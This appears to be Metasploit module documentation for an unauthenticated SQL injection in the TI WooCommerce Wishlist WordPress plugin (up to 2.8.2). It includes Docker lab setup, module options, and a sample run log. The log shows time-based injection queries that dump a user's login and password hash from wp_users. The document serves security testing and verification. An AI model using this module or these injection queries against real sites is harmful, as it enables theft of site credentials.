## Vulnerable Application

The vulnerability affects the **TI WooCommerce Wishlist** plugin for WordPress,
versions **up to 2.8.2**, allowing **unauthenticated SQL injection** via specific parameters.
The **WooCommerce** plugin is also required for the setup.

### Pre-requisites:
- **Docker** and **Docker Compose** installed.

### Setup Instructions:

1. **Download the Docker Compose file**:
   Save the following content in a `docker-compose.yml` file:

```yaml
version: '3.1'

services:
  wordpress:
    image: wordpress:latest
    restart: always
    ports:
      - 5555:80
    environment:
      WORDPRESS_DB_HOST: db
      WORDPRESS_DB_USER: chocapikk
      WORDPRESS_DB_PASSWORD: dummy_password
      WORDPRESS_DB_NAME: exploit_market
    mem_limit: 512m
    volumes:
      - wordpress:/var/www/html

  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: exploit_market
      MYSQL_USER: chocapikk
      MYSQL_PASSWORD: dummy_password
      MYSQL_RANDOM_ROOT_PASSWORD: '1'
    volumes:
      - db:/var/lib/mysql

volumes:
  wordpress:
  db:
```

2. **Start the Docker environment**:
   Run the following command in the directory where you saved the `docker-compose.yml` file:

```bash
docker-compose up -d
```

3. **Install WooCommerce and TI WooCommerce Wishlist Plugins**:
   - Download the WooCommerce and TI WooCommerce Wishlist plugins:

```bash
wget https://downloads.wordpress.org/plugin/woocommerce.9.3.3.zip
wget https://downloads.wordpress.org/plugin/ti-woocommerce-wishlist.2.8.2.zip
```

   - Install the plugins by copying them into your WordPress container:

```bash
unzip woocommerce.9.3.3.zip
docker cp woocommerce wordpress:/var/www/html/wp-content/plugins/

unzip ti-woocommerce-wishlist.2.8.2.zip
docker cp ti-woocommerce-wishlist wordpress:/var/www/html/wp-content/plugins/
```

4. **Activate WooCommerce and TI WooCommerce Wishlist Plugins**:
   - Navigate to `http://localhost:5555/wp-admin` in your browser, and activate both
   **WooCommerce** and **TI WooCommerce Wishlist** plugins.
   - Complete the WooCommerce setup wizard to ensure the plugin is properly
   initialized, including configuring the site through the "Customize Site" option.

## Verification Steps

1. **Set up WordPress** with the vulnerable **TI WooCommerce Wishlist 2.8.2** and **WooCommerce** plugins.
2. **Start Metasploit** using `msfconsole`.
3. Use the appropriate module for the vulnerability:

```bash
   use auxiliary/scanner/http/wp_ti_woocommerce_wishlist_sqli
```

4. Set the target's IP and URI:

```bash
   set RHOST <target_ip>
   set TARGETURI /
```

5. **Run the module**:

```bash
   run
```

6. **Verify the SQL Injection**:
   The SQL injection will attempt to retrieve or manipulate data from the WordPress database through the `order` parameter.

## Options

### PRODUCT_ID_MIN and PRODUCT_ID_MAX
These options specify the range of `product_id` values used to bruteforce the product
during the SQL injection attack.
The default range is from 1 to 100, but this can be adjusted based on your target.

### COUNT
This option specifies the number of rows to retrieve from the database during the SQL injection attack.

## Scenarios

The following scenario demonstrates an SQL injection attack against a WordPress
installation running **TI WooCommerce Wishlist 2.8.2** with **WooCommerce** in a Docker environment.

### Step-by-step Scenario

```bash
msf6 auxiliary(scanner/http/wp_ti_woocommerce_wishlist_sqli) > run http://127.0.0.1:5555

[*] Testing Product IDs from 0 to 100, please wait...
[+] Share key found: e93cca
[*] Performing SQL Injection using share key: e93cca
[*] SQL Injection successful, retrieving user credentials...
[*] {SQLi} Executing (SELECT 4 FROM information_schema.tables WHERE table_name = 'wp_users')
[*] {SQLi} Encoded to (SELECT 4 FROM information_schema.tables WHERE table_name = 0x77705f7573657273)
[*] {SQLi} Time-based injection: expecting output of length 1
[*] {WPSQLi} Retrieved default table prefix: 'wp_'
[*] {SQLi} Executing (select group_concat(CvjX) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) CvjX from wp_users limit 1) cUla)
[*] {SQLi} Encoded to (select group_concat(CvjX) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0x2f,0)),ifnull(user_pass,repeat(0x8c,0))) as binary) CvjX from wp_users limit 1) cUla)
[*] {SQLi} Time-based injection: expecting output of length 44
[*] {WPSQLi} Dumped user data:
wp_users
========

    user_login  user_pass
    ----------  ---------
    chocapikk   $P$BPdY0XccQT2nvSXE8bjsn1CERoF7eJ.

[+] Loot saved to: /home/chocapikk/.msf4/loot/20240930123016_default_127.0.0.1_wordpress.users_970346.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
